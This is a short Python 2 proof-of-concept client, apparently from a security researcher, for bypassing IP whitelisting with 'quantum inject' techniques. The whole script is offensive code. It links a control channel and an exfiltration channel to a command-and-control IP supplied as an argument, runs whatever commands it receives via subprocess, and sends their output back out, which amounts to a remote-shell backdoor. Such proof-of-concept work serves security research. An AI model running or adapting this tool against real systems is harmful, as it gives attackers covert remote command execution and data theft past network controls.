#!/usr/bin/env python
# DiabloHorn - QIBA_client_poc
# Bypassing IP whitelisting using quantum inject
import sys
import time

from connection_helper import ControlConnection, ExfilConnection
#References
# http://stackoverflow.com/questions/16279661/scapy-fails-to-sniff-packets-when-using-multiple-threads?rq=1

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print "{} <whitelisted ip> <cc ip> <whitelisted port>".format(sys.argv[0])
        sys.exit()

    whitelistedip = sys.argv[1]
    ccip = sys.argv[2]
    portnum = int(sys.argv[3])

    cc = ControlConnection(whitelistedip,portnum)
    cc.setup_cc()
    ec = ExfilConnection(whitelistedip, ccip, portnum)
    cc.connect()
    while True:
        connnums = cc.leaknums()
        #print connnums
        if connnums:
            ec.leakdata(connnums[0],connnums[2])
            ec.leakdata(connnums[1],connnums[2]+1)
            ec.leakdata(00000000,31337)
            count = 0
            while count < 10:
                print 'Getdata attempt:::::::'
                try:
                    time.sleep(0.5)
                    initphase = cc.getdata()
                    print "RECEIVED::::::: %s" % initphase
                    from subprocess import check_output
                    print "CMD::::::: %s" % initphase.split(':')[0]
                    cmdoutput = check_output(initphase.split(':')[0].split(' '))
                    print "CMD OUTPUT::::::: %s" % cmdoutput
                    ec.senddata(cmdoutput)
                    #break
                except KeyboardInterrupt:
                    break
                except Exception, e:
                    print e
                    pass
                count += 1
    cc.close()
